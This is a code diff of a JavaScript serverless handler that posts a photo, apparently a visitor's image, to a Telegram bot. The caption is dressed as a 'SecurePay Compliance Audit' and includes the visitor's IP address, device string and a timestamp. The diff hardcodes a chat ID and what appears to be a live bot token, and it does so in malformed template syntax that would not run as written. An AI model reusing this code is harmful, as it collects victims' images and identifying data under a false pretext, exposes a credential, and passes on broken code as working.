@@ -26,7 +26,7 @@ export default async function handler(req, res) {
 
     const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
     let body = Buffer.concat([
-      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`),
+      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${8923655458}\r\n`),
       Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n🚨 *SecurePay Compliance Audit*\n\n🏷️ *Node Tag:* \`${role}\`\n🌐 *IP Address:* \`${ipInfo}\`\n💻 *Device:* \`${userAgent}\`\n⏱️ *Timestamp:* \`${new Date().toUTCString()}\`\n✅ *Status:* \`Handshake Cleared & Logged\`\r\n`),
       Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`),
       Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="audit.png"\r\nContent-Type: image/png\r\n\r\n`),
@@ -34,7 +34,7 @@ export default async function handler(req, res) {
       Buffer.from(`\r\n--${boundary}--\r\n`)
     ]);
 
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${8923655458:AAF6BG9j-hTC7N7NUE5e-IBICdDhsrJVm_M}/sendPhoto`, {
       method: 'POST',
       headers: {
         'Content-Type': `multipart/form-data; boundary=${boundary}`
